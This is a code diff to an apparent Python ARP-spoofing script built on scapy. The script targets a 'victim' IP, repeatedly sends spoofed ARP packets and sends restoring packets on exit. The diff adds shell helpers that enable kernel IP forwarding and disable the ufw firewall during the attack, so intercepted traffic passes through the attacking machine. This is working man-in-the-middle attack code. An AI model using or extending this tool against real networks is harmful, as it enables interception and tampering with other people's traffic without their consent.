@@ -3,6 +3,30 @@
 import scapy.all as scapy
 import time
 import argparse
+import sys
+import subprocess
+
+def run_terminal_command(command):
+    try:
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        error_message = e.output.decode("utf-8") 
+        if "Operation not permitted" in error_message:
+            print("[Permission] You should run this as root or with sudo")
+        else:
+            print("ERROR: This code was projected for be used in debian based distributions with ufw installed")
+            print(error_message)
+        sys.exit()
+    else:
+        return result
+
+def ip_forwarding(active):
+    if active:
+        run_terminal_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        run_terminal_command("ufw disable")
+    else:
+        run_terminal_command("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        run_terminal_command("ufw enable")
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -40,6 +64,7 @@ def sendPackages(packages_list):
         scapy.send(package, verbose=False)
 
 try:
+    ip_forwarding(True)
     number_sent_packages = 0
     options = get_arguments()
     machine_ip = options.victim
@@ -54,5 +79,6 @@ try:
         printDinamically("[+] Sent {} spoof packages".format(number_sent_packages))
         time.sleep(2)
 except KeyboardInterrupt as err:
+    ip_forwarding(False)
     printDinamically("\n [-] Stopping... Reverting changes\n [+] Sending {} unspoof packages\n".format(len(unspoof_packages)))
     sendPackages(unspoof_packages)
